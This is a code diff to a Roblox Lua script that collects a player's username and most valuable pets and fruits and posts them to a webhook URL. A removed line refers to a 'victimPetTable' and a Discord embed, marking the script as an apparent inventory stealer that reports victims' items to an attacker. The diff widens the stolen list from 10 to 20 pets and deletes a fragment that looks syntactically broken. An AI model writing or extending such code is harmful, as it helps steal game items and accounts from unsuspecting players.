@@ -224,7 +224,7 @@ local function send(url)
 	local headers = {
 		["Content-Type"] = "application/json",
 	}
-    local i_pet = #pets >=1 and '\n``Top 10 best pets:``\n```'.. (function() local x = "";for i,v in ipairs(pets) do if i > 10 then break end x ..= v.name .." value: ".. formatNumber(v.value) .."\n" end return x end)().. '```' or ""
+    local i_pet = #pets >=1 and '\n``Top 20 best pets:``\n```'.. (function() local x = "";for i,v in ipairs(pets) do if i > 20 then break end x ..= v.name .." value: ".. formatNumber(v.value) .."\n" end return x end)().. '```' or ""
 	local i_fruit = #fruits >=1 and '\n``Top 5 best fruits:``\n```'.. (function() local x = "";for i,v in ipairs(fruits) do if i > 5 then break end x ..= v.name .." value: ".. formatNumber(v.value) .."\n" end return x end)().. '```' or ""
 	local body = game:GetService("HttpService"):JSONEncode({
 		["username"] = game.Players.LocalPlayer.Name,
@@ -274,13 +274,6 @@ game.Players.PlayerAdded:Connect(function(player)
         player.Chatted:Connect(function(msg)
             start(player.Name)
         end)
-    end
-
-end)
-
-createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
-            break
-        end
     end
 
 end)
